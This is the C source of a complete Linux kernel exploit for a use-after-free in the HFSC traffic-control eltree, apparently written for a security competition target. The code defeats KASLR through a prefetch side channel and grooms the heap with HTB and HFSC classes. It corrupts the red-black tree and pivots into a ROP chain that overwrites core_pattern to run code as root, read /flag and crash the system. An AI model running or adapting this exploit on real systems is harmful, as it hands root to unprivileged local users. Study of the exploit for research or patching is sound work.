/*
 *    HFSC eltree Use-After-Free exploit (mitigation-v4)
 *      - D3vil (savy@syst3mfailure.io)
*/

#define _GNU_SOURCE

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdbool.h>
#include <sched.h>
#include <fcntl.h>
#include <string.h>
#include <byteswap.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <linux/pkt_cls.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <netinet/tcp.h>
#include <netinet/in.h>
#include <sys/stat.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <signal.h>
#include <sys/signalfd.h>
#include <sys/resource.h>
#include <sys/utsname.h>
#include <sys/syscall.h>

#include "netlink_utils.h"

#define PAGE_SIZE 0x1000

// Sandbox
#define UID_MAP   "/proc/self/uid_map"
#define GID_MAP   "/proc/self/gid_map"
#define SETGROUPS "/proc/self/setgroups"

// Network interfaces
#define ADD_LINK  RTM_NEWLINK
#define DEL_LINK  RTM_DELLINK
#define NO_PRIO 0

// Traffic control
#define ADD_QDISC  RTM_NEWQDISC
#define DEL_QDISC  RTM_DELQDISC
#define ADD_CLASS  RTM_NEWTCLASS
#define DEL_CLASS  RTM_DELTCLASS
#define SHOW_CLASS RTM_GETTCLASS

#define TC_H(x, y) (x << 16 | y)

// Prefetch side channel
#define KERNEL_START 0xffffffff80000000
#define KERNEL_END   0xffffffffc0000000
#define KERNEL_STEP  0x200000

#define CEA_START 0xfffffe0000001000
#define CEA_END   0xffffff0000000000
#define CEA_STEP  0x1000

//#define PREFETCH 1
//#define LOCAL_PREFETCH 1

#ifdef LOCAL_PREFETCH
#define KERNEL_BASE 0xffffffff82600000 // KPTI is on
#define KASLR_THRESHOLD 50
#define CEA_THRESHOLD   50
#else // Mitigation instance v4
#define KERNEL_BASE 0xffffffff81000000 // KPTI is off
#define KASLR_THRESHOLD 98
#define CEA_THRESHOLD   98
#endif

#define POTENTIAL_END (8ULL << 30)
#define CEA_OFFSET(offset) (offset + 0x1f58)

// Exploitation
#define KMALLOC_1K_PARTIALS 0x700
#define NUM_HTB_CLASSES 0x20
#define NUM_HFSC_CLASSES 0x20
#define HFSC_CLASS_ELNODE_OFFSET 0xa0
#define HTB_CLASS_CEIL64_OFFSET 0x30
#define HFSC_CLASS_CHUNK_SIZE 1024 // kmalloc-1k chunk

#define EVIL_CORE_PATTERN "|/proc/%P/exe"
#define EVIL_CORE_PATTERN_LEN (13 + 1)

// Exploitation - Gadgets
#define CORE_PATTERN 0xffffffff83db3720
#define DO_IDLE 0xffffffff81224d20

// COP gadget 1: [R14+0x18] R14 == htb_class addr, [R14+0x18] == htb_class->rate64 aka CEA
//
// ffffffff8124d7de:    mov    rax,QWORD PTR [r14+0x18] // RAX = CEA
// ffffffff8124d7e2:    mov    rax,QWORD PTR [rax+0x28] // RAX = [CEA + 0x28] (COP gadget 2)
// ffffffff8124d7e6:    test   rax,rax
// ffffffff8124d7e9:    je     0xffffffff8124d875       // JMP not taken
// ffffffff8124d7ef:    mov    rcx,QWORD PTR [rsp+0x8]
// ffffffff8124d7f4:    xor    edx,edx
// ffffffff8124d7f6:    mov    esi,ebx
// ffffffff8124d7f8:    mov    rdi,r14                  // RDI = CEA
// ffffffff8124d7fb:    call   0xffffffff82484e80       // call RAX (COP gadget 2)
//
#define COP_GADGET_1 0xffffffff8124d7de

// COP gadget 2: RDI == htb_class addr, [RDI+0x18] == htb_class->rate64 aka CEA
//
// ffffffff820d6375:    push   rbp
// ffffffff820d6376:    push   rbx
// ffffffff820d6377:    mov    rax,QWORD PTR [rdi+0x18] // RAX = CEA
// ffffffff820d637b:    mov    rbp,QWORD PTR [rax+0x8]  // RBP = [CEA + 0x8] = CEA + 0x8 (points to itself)
// ffffffff820d637f:    test   rbp,rbp
// ffffffff820d6382:    je     0xffffffff820d63a6       // JMP not taken
// ffffffff820d6384:    mov    rax,QWORD PTR [rbp+0x28] // RAX =  (CEA + 0x8) + 0x28 = CEA + 0x30 = LEAVE_RET gadget
// ffffffff820d6388:    mov    rbx,rdi
// ffffffff820d638b:    call   0xffffffff82484e80       // call RAX (LEAVE_RET gadget)
//
#define COP_GADGET_2 0xffffffff820d6375

// leave; ret
#define LEAVE_RET 0xffffffff81157b43
// pop rdi ; pop rsi ; pop rdx ; pop rcx ; jmp 0xffffffff824855d0
#define POP_RDI_POP_RSI_POP_RDX_POP_RCX_RET 0xffffffff810ed209
// pop rcx ; jmp 0xffffffff824855d0
#define POP_RCX_RET 0xffffffff8102e67c;
// rep movs BYTE PTR es:[rdi],BYTE PTR ds:[rsi] ; jmp 0xffffffff824855d0
#define REP_MOVS_BYTE_PTR_RDI_BYTE_PTR_RSI_RET 0xffffffff8246de78
// jmp 0xffffffff810007a3
#define INFINITE_LOOP 0xffffffff810007a3

uint64_t kbase = 0;
uint64_t ceabase = 0;

struct tc_handle {
    char *name;
    void (*func)(struct nlmsghdr *msg, int cmd, void *opt);
};

struct tbf_custom_opt {
    uint32_t burst;
    uint64_t rate64;
};

struct htb_custom_opt {
    uint64_t rate64;
    uint64_t ceil64;
};

void tc_handle_tbf(struct nlmsghdr *msg, int cmd, void *opt);
void tc_handle_hfsc(struct nlmsghdr *msg, int cmd, void *opt);
void tc_handle_netem(struct nlmsghdr *msg, int cmd, void *opt);
void tc_handle_htb(struct nlmsghdr *msg, int cmd, void *opt);
void sig_handler(int s);

struct tc_handle tc_handlers[] = {
    { "tbf",   tc_handle_tbf   },
    { "hfsc",  tc_handle_hfsc  },
    { "netem", tc_handle_netem },
    { "htb",   tc_handle_htb   }
};

// Utils
int assign_to_core(int core_id) {
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(core_id, &mask);
    if (sched_setaffinity(getpid(), sizeof(mask), &mask) < 0) {
        perror("[x] sched_setaffinity()");
        return -1;
    }
    return 0;
}

int write_file(char *path, char *data, size_t size) {
    int fd = open(path, O_WRONLY | O_CREAT, 0777);
    if (fd < 0) {
        perror("[x] write_file() - open()");
        return -1;
    }
    if (write(fd, data, size) < 0) {
        close(fd);
        return -1;
    }
    close(fd);
    return 0;
}

int new_map(char *path, int in, int out) {
    char buff[0x40] = { 0 };
    snprintf(buff, sizeof(buff), "%d %d 1", in, out);
    if (write_file(path, buff, strlen(buff)) < 0) {
        perror("[x] new_map() - write()");
        return -1;
    }
    return 0;
}

int ulimit_max(void) {
    struct rlimit limit = { };
    if (getrlimit(RLIMIT_NOFILE, &limit) < 0) {
        perror("[x] getrlimit()");
        return -1;
    }
    limit.rlim_cur = limit.rlim_max;
    if (setrlimit(RLIMIT_NOFILE, &limit) < 0) {
        perror("[x] setrlimit()");
        return -1;
    }
    return 0;
}

int setup_sandbox(void) {
    int uid = getuid();
    int gid = getgid();
    if (unshare(CLONE_NEWNS|CLONE_NEWUSER|CLONE_NEWNET) < 0) {
        perror("unshare(CLONE_NEWNS|CLONE_NEWUSER|CLONE_NEWNET)");
        return -1;
    }
    write_file(SETGROUPS, "deny", strlen("deny"));
    new_map(UID_MAP, 0, uid);
    new_map(GID_MAP, 0, gid);
    ulimit_max();
    return 0;
}

uint64_t prefetch_sidechannel(uint64_t addr) {
    uint64_t a, b, c, d;
    asm volatile (".intel_syntax noprefix;"
        "mfence;"
        "rdtscp;"
        "mov %0, rax;"
        "mov %1, rdx;"
        "xor rax, rax;"
        "lfence;"
        "prefetchnta qword ptr [%4];"
        "prefetcht2 qword ptr [%4];"
        "xor rax, rax;"
        "lfence;"
        "rdtscp;"
        "mov %2, rax;"
        "mov %3, rdx;"
        "mfence;"
        ".att_syntax;"
        : "=r" (a), "=r" (b), "=r" (c), "=r" (d)
        : "r" (addr)
        : "rax", "rbx", "rcx", "rdx");
    a = (b << 32) | a;
    c = (d << 32) | c;
    return c - a;
}

uint64_t prefetch_leak(uint64_t scan_start, uint64_t scan_end, uint64_t step, uint64_t threshold)  {
    uint64_t size = (scan_end - scan_start) / step;
    uint64_t *data = calloc(size, sizeof(uint64_t));
    uint64_t min = ~0, addr = ~0, potential_end = 0;

    do {
        bool set = false;

        for (uint64_t idx = 0; idx < size; idx++) {
            uint64_t test_addr = scan_start + idx * step;
            if (potential_end && test_addr > potential_end)
                break;
            uint64_t time = prefetch_sidechannel(test_addr);
            if (time < threshold) {
                data[idx]++;
                if (!potential_end)
                    potential_end = test_addr + POTENTIAL_END;
            }
        }

        for (int i = 0; i < size; i++) {
            if (!set && data[i] >= 1) {
                addr = scan_start + i * step;
                set = true;
            }
        }
    } while (addr == ~0);

    free(data);
    return addr;
}

int net_if(int cmd, char *type, int num, int flags, int change) {
    struct nlmsghdr *msg;
    struct ifinfomsg ifinfo = {};
    char name[0x100] = { 0 };

    strcpy(name, type);

    if (num >= 0)
        snprintf(name, sizeof(name), "%s-%d", type, num);

    int sk = nl_init_request(cmd, &msg, NLM_F_REQUEST|NLM_F_CREATE);
    if (sk < 0) {
        perror("net_if() - nl_init_request()");
        return -1;
    }

    ifinfo.ifi_family = AF_UNSPEC;
    ifinfo.ifi_type = PF_NETROM;
    ifinfo.ifi_index = (cmd == DEL_LINK) ? if_nametoindex(name) : 0;
    ifinfo.ifi_flags = flags;
    ifinfo.ifi_change = change ? 1 : 0;

    nlmsg_append(msg, &ifinfo, sizeof(ifinfo), NLMSG_ALIGNTO);

    if (cmd == ADD_LINK) {
        struct nlmsghdr *options = nlmsg_alloc();
        nla_put_u32(msg, IFLA_MTU, 65535);
        nla_put_string(msg, IFLA_IFNAME, name);
        nla_put_string(options, IFLA_INFO_KIND, type);
        nla_put_nested(msg, IFLA_LINKINFO, options);
        nlmsg_free(options);
    }

    return nl_complete_request(sk, msg);
}

int tc_init_request(struct nlmsghdr **msg, int cmd, char *name, char *net_if, int handle, int parent, int change) {
    struct tcmsg tchdr = {};
    int flags = NLM_F_REQUEST;

    if (cmd == SHOW_CLASS)
        flags |= NLM_F_DUMP;
    else if (!change)
        flags |= NLM_F_CREATE;

    int sk = nl_init_request(cmd, msg, flags);
    if (sk < 0) {
        perror("tc_prepare_msg() - nl_init_request()");
        return -1;
    }

    tchdr.tcm_family  = AF_UNSPEC;
    tchdr.tcm_ifindex = if_nametoindex(net_if);
    tchdr.tcm_handle  = handle;
    tchdr.tcm_parent  = parent;
    tchdr.tcm_info    = 0;

    nlmsg_append(*msg, &tchdr, sizeof(struct tcmsg), NLMSG_ALIGNTO);
    nla_put_string(*msg, TCA_KIND, name);

    return sk;
}

int tc_complete_request(int sk, struct nlmsghdr *msg) {
    return nl_complete_request(sk, msg);
}

void tc_handle_tbf(struct nlmsghdr *msg, int cmd, void *opt) {
    if (cmd == ADD_QDISC) {
        struct nlmsghdr *options = nlmsg_alloc();
        struct tc_tbf_qopt qopt = { .limit = 10000 };
        uint32_t burst  = 100000;
        uint64_t rate64 = 100000;

        if (opt) {
            struct tbf_custom_opt *custom = (struct tbf_custom_opt *)opt;
            burst = custom->burst;
            rate64 = custom->rate64;
        }

        nla_put(options, TCA_TBF_PARMS, sizeof(qopt), &qopt);
        nla_put_u32(options, TCA_TBF_BURST, burst);
        nla_put_u64(options, TCA_TBF_RATE64, rate64);
        nla_put_nested(msg, TCA_OPTIONS, options);
        nlmsg_free(options);
    }
}

void tc_handle_hfsc(struct nlmsghdr *msg, int cmd, void *opt) {
    if (cmd == ADD_QDISC) {
        struct tc_hfsc_qopt qopt = { .defcls = 0 };

        nla_put(msg, TCA_OPTIONS, sizeof(qopt), &qopt);
    } else if (cmd == ADD_CLASS) {
        struct nlmsghdr *options = nlmsg_alloc();
        struct tc_service_curve copt = { .m2 = 1000 };

        nla_put(options, TCA_HFSC_RSC, sizeof(copt), &copt);
        nla_put_nested(msg, TCA_OPTIONS, options);
        nlmsg_free(options);
    }
}

void tc_handle_netem(struct nlmsghdr *msg, int cmd, void *opt) {
    if (cmd == ADD_QDISC) {
        struct tc_netem_qopt opt = { 
            .limit = 1000,
            .duplicate = -1,
        };
        nla_put(msg, TCA_OPTIONS, sizeof(opt), &opt);
    }
}

void tc_handle_htb(struct nlmsghdr *msg, int cmd, void *opt) {
    if (cmd == ADD_QDISC) {
        struct nlmsghdr *options = nlmsg_alloc();
        struct tc_htb_glob qopt = { .version = 3 };

        nla_put(options, TCA_HTB_INIT, sizeof(qopt), &qopt);
        nla_put_nested(msg, TCA_OPTIONS, options);
        nlmsg_free(options);
    } else if (cmd == ADD_CLASS) {
        struct nlmsghdr *options = nlmsg_alloc();
        uint32_t rtab[256] = { 0 };
        uint32_t ctab[256] = { 0 };
        struct tc_htb_opt copt = {
            .prio = 1,
            .cbuffer = 1,
            .rate.rate = 100,
            .ceil.rate = 100,
        };
        // Random placeholder
        uint64_t rate64 = 0xc1cc10be110;
        uint64_t ceil64 = 0xc1cc10be110;

        if (opt) {
            struct htb_custom_opt *custom = (struct htb_custom_opt *)opt;
            rate64 = custom->rate64;
            ceil64 = custom->ceil64;
        }

        nla_put(options, TCA_HTB_PARMS, sizeof(copt), &copt);
        nla_put(options, TCA_HTB_RTAB, sizeof(rtab), rtab);
        nla_put(options, TCA_HTB_CTAB, sizeof(ctab), ctab);
        nla_put_u64(options, TCA_HTB_RATE64, rate64);
        nla_put_u64(options, TCA_HTB_CEIL64, ceil64);
        nla_put_nested(msg, TCA_OPTIONS, options);
        nlmsg_free(options);
    }
}

int tc(int cmd, char *name, char *net_if, int handle, int parent, void *opt, int change) {
    struct nlmsghdr *msg;

    int sk = tc_init_request(&msg, cmd, name, net_if, handle, parent, change);
    if (sk < 0)
        return -1;

    for (int i = 0; i < sizeof(tc_handlers) / sizeof(tc_handlers[0]); i++) {
        if (!strcmp(name, tc_handlers[i].name)) {
            tc_handlers[i].func(msg, cmd, opt);
            break;
        }
    }

    return tc_complete_request(sk, msg);
}

uint64_t *tc_dump(char *name, char *net_if, int handle, int parent, int num_recvmsg) {
    struct nlmsghdr *msg;

    int sk = tc_init_request(&msg, SHOW_CLASS, name, net_if, handle, parent, 0);
    if (sk < 0)
        return NULL;

    return (uint64_t *)nl_send_and_receive(sk, msg, num_recvmsg);
}

int send_packets(uint8_t *if_name, size_t pkt_size, uint64_t pkt_num, int prio) {
    struct sockaddr_in dst = {};
    struct ifreq ifr = {};

    char *pkt = calloc(1, pkt_size);
    if (!pkt) {
        return -1;
    }

    int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (s < 0) {
        perror("[x] socket(SOCK_RAW)");
        free(pkt);
        return -1;
    }

    strncpy(ifr.ifr_name, if_name, IFNAMSIZ);

    if (setsockopt(s, SOL_SOCKET, SO_BINDTODEVICE, ifr.ifr_name, IFNAMSIZ) < 0) {
        perror("[x] setsockopt(SO_BINDTODEVICE)");
        free(pkt);
        close(s);
        return -1;
    }

    if (prio > 0) {
        if (setsockopt(s, SOL_SOCKET, SO_PRIORITY, &prio, sizeof(prio)) < 0) {
            perror("[x] setsockopt(SO_PRIORITY)");
            free(pkt);
            close(s);
            return -1;
        }
    }

    dst.sin_family = AF_INET;
    dst.sin_addr.s_addr = 0xdeadbeef;

    for (uint64_t i = 0; i < pkt_num; i++) {
        memset(pkt, i, pkt_size);
        if (sendto(s, pkt, pkt_size, 0, (struct sockaddr *)&dst, sizeof(dst)) < 0) {
            perror("[x] sendto()");
            free(pkt);
            close(s);
            return -1;
        }
    }

    free(pkt);
    close(s);
    return 0;
}

void cea_store_payload(void) {
    char ctx[0x100] = { 0 };
    struct sigaction sa = { .sa_handler = sig_handler };

    uint64_t *cea_payload = (uint64_t *)ctx;

    // Stage 1: Stack pivot into cpu_entry_area
    cea_payload[1]  = CEA_OFFSET(ceabase) + 8;
    cea_payload[5]  = kbase + COP_GADGET_2;
    cea_payload[6]  = kbase + LEAVE_RET;

    // Stage 2: Overwrite core_pattern
    cea_payload[2]  = kbase + POP_RDI_POP_RSI_POP_RDX_POP_RCX_RET;
    cea_payload[3]  = kbase + CORE_PATTERN;
    cea_payload[4]  = CEA_OFFSET(ceabase) + 0x60;
    // ... [5]
    // ... [6]
    cea_payload[7]  = kbase + POP_RCX_RET;
    cea_payload[8]  = EVIL_CORE_PATTERN_LEN;
    cea_payload[9]  = kbase + REP_MOVS_BYTE_PTR_RDI_BYTE_PTR_RSI_RET;
    cea_payload[10] = kbase + DO_IDLE;
    cea_payload[11] = kbase + INFINITE_LOOP;

    strcpy(ctx + 0x60, EVIL_CORE_PATTERN);

    sigaction(SIGILL, &sa, NULL);

    __asm__ __volatile__ (
        ".intel_syntax noprefix;"
        "mov rsp, %0;"
        "mov r15, qword ptr [rsp];"
        "mov r14, qword ptr [rsp + 0x08];"
        "mov r13, qword ptr [rsp + 0x10];"
        "mov r12, qword ptr [rsp + 0x18];"
        "mov rbp, qword ptr [rsp + 0x20];"
        "mov rbx, qword ptr [rsp + 0x28];"
        "mov r11, qword ptr [rsp + 0x30];"
        "mov r10, qword ptr [rsp + 0x38];"
        "mov r9,  qword ptr [rsp + 0x40];"
        "mov r8,  qword ptr [rsp + 0x48];"
        "mov rax, qword ptr [rsp + 0x50];"
        "mov rcx, qword ptr [rsp + 0x58];"
        "mov rdx, qword ptr [rsp + 0x60];"
        "mov rsi, qword ptr [rsp + 0x68];"
        "mov rdi, qword ptr [rsp + 0x70];"
        "ud2;"
        ".att_syntax;" 
        :
        : "r" (&ctx)
    );

    // Unreachable
}

void sig_handler(int s) {
    char core_pattern[0x100] = { 0 };

    assign_to_core(1);

    int fd = open("/proc/sys/kernel/core_pattern", O_RDONLY);
    read(fd, core_pattern, sizeof(core_pattern));
    close(fd);

    if (strstr(core_pattern, "%P") != NULL) {
        puts("r0o0ot");
        *(uint64_t *)(2 + 2) = 5; // Crash the program
    }
}

void main(int argc, char *argv[]) {
    char if_name[0x100] = { 0 };
    struct tbf_custom_opt tbf_custom_opt = { };
    struct htb_custom_opt htb_custom_opt = { };

    if (!getuid()) {
        assign_to_core(1);

        pid_t pid;
        char flag[0x100] = { 0 };
        sscanf(argv[0], "/proc/%u/exe", &pid);

        int pfd = syscall(SYS_pidfd_open, pid, 0);
        int stdinfd = syscall(SYS_pidfd_getfd, pfd, 0, 0);
        int stdoutfd = syscall(SYS_pidfd_getfd, pfd, 1, 0);
        int stderrfd = syscall(SYS_pidfd_getfd, pfd, 2, 0);

        dup2(stdinfd,0);
        dup2(stdoutfd,1);
        dup2(stderrfd,2);

        int fd = open("/flag", O_RDONLY);
        read(fd, flag, sizeof(flag));
        close(fd);

        printf("\n\n%s\n\n", flag);

        sleep(1);
        write_file("/proc/sysrq-trigger", "c\n", 2);
        return;
	}

    assign_to_core(0);

#ifdef PREFETCH
    puts("prefetching kbase...");
    kbase = prefetch_leak(KERNEL_START, KERNEL_END, KERNEL_STEP, KASLR_THRESHOLD) - KERNEL_BASE;
    printf("kbase: 0X%llx\n", kbase + KERNEL_BASE);

    puts("prefetching cea...");
    ceabase = prefetch_leak(CEA_START, CEA_END, CEA_STEP, CEA_THRESHOLD);
    printf("cea: 0x%llx\n", CEA_OFFSET(ceabase));
#else
    kbase = 0;
    ceabase = CEA_START;
#endif

    // @step(1): Initialization
    // Set up qdiscs for the lo interface
    // TBF is configured with a very low rate
    // So as soon as we send packets, it runs out of tokens and reschedules itself
    // for later. From this moment on, the interface is unable to dequeue packets
    setup_sandbox();
    net_if(ADD_LINK, "lo", -1, IFF_UP, true);

    tbf_custom_opt.burst  = 100;
    tbf_custom_opt.rate64 = 1;
    tc(ADD_QDISC, "tbf",  "lo", TC_H(1, 0), TC_H_ROOT, &tbf_custom_opt, 0);
    tc(ADD_QDISC, "hfsc", "lo", TC_H(2, 0), TC_H(1, 0), NULL, 0);
    send_packets("lo", 64, 2, 0);

    net_if(ADD_LINK, "dummy", 0, IFF_UP, true);
    net_if(ADD_LINK, "dummy", 1, IFF_UP, true);

    tc(ADD_QDISC, "tbf",  "dummy-1", TC_H(2, 0), TC_H_ROOT, NULL, 0);
    tc(ADD_QDISC, "htb",  "dummy-1", TC_H(1, 0), TC_H(2, 0), NULL, 0);
    tc(ADD_QDISC, "hfsc", "dummy-0", TC_H(6, 0), TC_H_ROOT, NULL, 0);

    for (int i = 0; i < KMALLOC_1K_PARTIALS; i++)
        tc(ADD_CLASS, "hfsc", "dummy-0", TC_H(1, i + 1), TC_H(1, 0), NULL, 0);

    // @step(2): Prepare the memory layout
    // Ensure HFSC class 2:3 is "surrounded" by HTB classes
    // Then allocate all the other HFSC classes
    // And the vulnerable object, class 2:1
    for (int i = 3; i < NUM_HTB_CLASSES; i++) {
        if (i == (NUM_HTB_CLASSES / 2))
            tc(ADD_CLASS, "hfsc",  "lo", TC_H(2, 3), TC_H(2, 0), NULL, 0);

        tc(ADD_CLASS, "htb",  "dummy-1", TC_H(1, i), TC_H(1, 0), NULL, 0);
    }

    for (int i = 2; i < NUM_HFSC_CLASSES; i++) {
        if (i == 3) // class 2:3 is already allocated
            continue;

        tc(ADD_CLASS, "hfsc",  "lo", TC_H(2, i), TC_H(2, 0), NULL, 0);
    }

    tc(ADD_CLASS, "hfsc",  "lo", TC_H(2, 1), TC_H(2, 0), NULL, 0);
    tc(ADD_QDISC, "netem", "lo", TC_H(3, 0), TC_H(2, 1), NULL, 0);


    // @step(3): Prepare the tree layout and trigger the vulnerability
    // Insert the classes in the eltree
    // Since class 2:1 has netem as leaf qdisc and duplication is enabled
    // it will be inserted twice in the eltree
    send_packets("lo", 64, 1, TC_H(2, 2));
    send_packets("lo", 64, 1, TC_H(2, 3));
    send_packets("lo", 64, 1, TC_H(2, 4));
    send_packets("lo", 64, 1, TC_H(2, 1)); // Trigger the vulnerabilty, 2:1 is inserted twice

    //
    //               2:3
    //               / \
    //            2:2   2:4
    //                   \
    //                    2:1
    //                    /
    //                  2:1 (Dupe)
    //

    // @step(4): Overwrite the hfsc_class 2:1 with a htb_class
    // Delete the HFSC class 2:1, the class object is freed, but still accessible in the eltree
    // Replace the 2:1 class with a HTB class, 1:2
    tc(DEL_CLASS, "hfsc", "lo", TC_H(2, 1), 0, NULL, 0);

    //
    //               2:3 
    //               / \
    //            2:2   2:4
    //                   \
    //                    2:1 (Now it is free but sill accessible in eltree!)
    //                    /
    //                  2:1 (Dupe)
    //

    tc(ADD_CLASS, "htb",  "dummy-1", TC_H(1, 2), TC_H(1, 0), NULL, 0);

    //
    //               2:3 
    //               / \
    //            2:2   2:4
    //                   \
    //                    1:2 (2:1 replaced by a HTB class object)
    //

    // @step(5): Delete class 2:4 from the tree
    // Remove class 2:4
    tc(DEL_CLASS, "hfsc",  "lo", TC_H(2, 4), 0, NULL, 0); // del 

    //
    //               2:3 
    //               / \
    //            2:2   x (2:4 is deleted)
    //                   \
    //                    1:2 (HTB)
    //
    //  After the deletion:
    //
    //               2:3
    //               / \
    //            2:2   1:2 (HTB)
    //

    // @step(6): Trigger a tree update so 1:2 becomes the root, then leak class 2:3
    // Trigger tree update via hfsc_change_class(), the tree is rebalanced
    // the parent, 2:3, now becomes 1:2 rb_left child, 2:2 its right child
    // Since 1:2 is a HTB class, the rb_left child, overlaps with htb->xstats
    // By dumping the class xstats we can now leak the 2:3 class address
    tc(ADD_CLASS, "hfsc",  "lo", TC_H(2, 2), TC_H(2, 0), NULL, 1); // update

    // First the class is deleted
    //
    //               2:3
    //               / \
    //              x   1:2 (HTB)
    //
    // Then re-inserted:
    //
    //               2:3
    //                 \
    //                  1:2 (HTB)
    //                   \
    //                    2:2
    //
    // And the tree rebalanced (first branch, case 3, in __rb_insert())
    //
    //               1:2 (HTB) now it is the root node
    //               / \
    //            2:3   2:2
    //

    // Leak xstats class 2:3
    uint64_t *xstats = tc_dump("htb", "dummy-1", 0, TC_H(1, 0), 2);
    uint64_t hfsc_elnode_addr = xstats[0x25F]; // Class 1:2 xstats contain the node 2:3 pointer
    uint64_t hfsc_class_addr  = hfsc_elnode_addr - HFSC_CLASS_ELNODE_OFFSET;
    free(xstats);

    printf("hfsc_class @ 0x%llx\n", hfsc_class_addr);

    uint64_t htb_class_addr = hfsc_class_addr + 0x400;
    printf("htb_class @ 0x%llx\n", htb_class_addr);

    // @step(7): Increment the class 2:3 pointer by sending packets to the interface
    // We increment the 2:3 node pointer by sending packets to the interface
    // We set it to the address of htb->ceil.rate_bytes_ps - 8 bytes
    uint64_t ptr_increment = HFSC_CLASS_CHUNK_SIZE - HFSC_CLASS_ELNODE_OFFSET + HTB_CLASS_CEIL64_OFFSET - 8;
    send_packets("dummy-1", 64, ptr_increment, TC_H(1, 2)); // packet inc

    //
    // Note: In the following schemes
    //
    //   F = Fake 2:3 class, &htb->ceil.rate_bytes_ps - 8 (the address we obtain incrementing the 2:3 node pointer)
    //   Q = &htb->leaf.q - 0x10
    //   T = htb->leaf.q
    //
    //   Our goal is to set the Q rb_left node (Q + 0x10, or &htb->leaf.q) to F
    //   F corresponds to &htb->ceil.rate_bytes_ps - 8, so by overlapping htb->leaf.q with F
    //   we can fake the second qword of a Qdisc structure, aka htb->leaf.q->dequeue()
    //

    //
    //               1:2 (HTB)
    //               /  \
    //              F*  2:2
    //               \
    //    0xc1cc10be110
    //
    //  *The rb_left child of class 1:2 has been incremented, now it points to
    //   the next object in memory, another HTB class, 8 bytes before the htb->ceil.rate_bytes_ps [1]
    //   user-controlled field.
    //
    //   gef➤  x/4gx 0xfffffe8804a0c828 // F (htb_class + 0x28)
    //   0xfffffe8804a0c828:	0x0000000000002200	0x00000c1cc10be110 [1]
    //   0xfffffe8804a0c838:	0x000000000013af18	0x0000000000002200
    //

    // @step(8): Modify htb->ceil.rate_bytes_ps to fake a rb_right node for class 2:3 (F)
    // Now we add node 2:5 to the tree, and then by modiyfing htb->ceil.rate_bytes_ps
    // fake a rb_right child node for the fake 2:3 class
    send_packets("lo", 64, 1, TC_H(2, 5));

    //
    //               1:2 (HTB)
    //              /  \
    //             F*   2:2
    //             \     \
    //   0xc1cc10be110    2:5
    //
    //  *By adding 2:5, we also set the 2:3 (F) parent, aka we write a pointer [1] 8 bytes before
    //   htb->ceil.rate_bytes_ps [2] (else branch, Case 1 in `__rb_insert()`)
    //
    //   gef➤  x/4gx 0xfffffe8804a0c828 // F (htb_class + 0x28)
    //   0xfffffe8804a0c828:	0xfffffe8804a5f0a1 [1]	0x00000c1cc10be110 [2]
    //   0xfffffe8804a0c838:	0x000000000013af18	    0x0000000000002200
    //

    // Now by modifying ceil64 we can fake a right node for F
    uint64_t next_htb_class_qdisc_ptr = htb_class_addr + 0x400 + 0x100;

    // Update rate64 and ceil64
    htb_custom_opt.rate64 = next_htb_class_qdisc_ptr - 0x10;
    htb_custom_opt.ceil64 = htb_custom_opt.rate64;
    for (int i = 3; i < 0x20; i++)
        tc(ADD_CLASS, "htb",  "dummy-1", TC_H(1, i), TC_H(1, 0), &htb_custom_opt, 1);

    //
    //               1:2 (HTB)
    //               /  \
    //              F    2:2
    //              \     \
    //              Q*     2:5
    //              /
    //             T
    //
    // * Now by modifying htb->ceil.rate_bytes_ps (Q) we can fake a rb_right child for F [1]
    //   Q corresponds to &htb->leaf.q - 0x10
    //
    //   gef➤  x/4gx 0xfffffe8804a0c828 // F (htb_class + 0x28)
    //   0xfffffe8804a0c828:	0x0000000000002200	0xfffffe8804a0ccf0 [1]
    //   0xfffffe8804a0c838:	0x0000000000000000	0x0000000000002200
    //
    //   gef➤  x/4gx 0xfffffe8804a0ccf0 // Q (&htb->leaf.q - 0x10)
    //   0xfffffe8804a0ccf0:	0x0000000000000000	0x0000000000000000
    //   0xfffffe8804a0cd00:	0xfffffe8804a14000	0x0000000000000000
    //       This is htb->leaf.q (T) ------^
    //

    // @step(9): Delayed trigger, increase TBF rate and send packets to all htb classes
    // The TBF rate now is low enough to prevent an immediate dequeue, packets will be dequeued in a couple of seconds
    // The time we need to finalize the attack and replace htb->leaf.q with the address of the fake 2:3 class
    tbf_custom_opt.burst  = 100;
    tbf_custom_opt.rate64 = 100;
    tc(ADD_QDISC, "tbf",  "dummy-1", TC_H(2, 0), TC_H_ROOT, &tbf_custom_opt, 1);

    // Delayed trigger
    for (int i = 3; i < NUM_HTB_CLASSES; i++)
        send_packets("dummy-1", 64, 2, TC_H(1, i));

    // @step(10): Trigger tree rebalance by deleting 2:5 and 2:2
    tc(DEL_CLASS, "hfsc",  "lo", TC_H(2, 5), 0, NULL, 0);

    //
    //               1:2 (HTB)
    //               / \
    //              F   2:2
    //              \    \
    //               Q    x (2:5 deleted)
    //              /
    //             T
    //

    tc(DEL_CLASS, "hfsc",  "lo", TC_H(2, 2), 0, NULL, 0);

    //
    //               1:2 (HTB)
    //               / \
    //              F   x (2:2 deleted)
    //              \
    //               Q
    //              /
    //             T
    //
    // The tree is then rebalanced
    // - `node != sibling` branch in `__rb_erase_color()`
    // - Case 1 (right rotate at parent)
    // - Case 4 (right rotate at parent + color flips)
    //
    //                 F
    //                 \
    //                  Q
    //                 / \
    //                T   1:2
    //

    // @step(11): Trigger a new rebalance by adding 2:6, 2:7, 2:8
    // Now add three more nodes to trigger the rebalance
    // Now the fake 2:3 overlaps to htb->leaf.q (qdisc)
    send_packets("lo", 64, 1, TC_H(2, 6));

    //
    //                 F
    //                 \
    //                  Q
    //                 / \
    //                T   1:2
    //                      \
    //                       2:6
    //

    send_packets("lo", 64, 1, TC_H(2, 7));

    //
    //                 F
    //                 \
    //                  Q
    //                 / \
    //                T   2:6
    //                    / \
    //                 1:2   2:7
    //

    send_packets("lo", 64, 1, TC_H(2, 8));

    // The tree is rebalanced:
    // - else branch in `__rb_insert()`
    // - Case 1 resolved
    // - Second iteration, else branch again
    // - Case 3 is resolved (left rotate grandparent)
    //
    //                Q
    //               / \
    //              F   2:6
    //                  / \
    //                1:2  2:7
    //                      \
    //                       2:8
    //

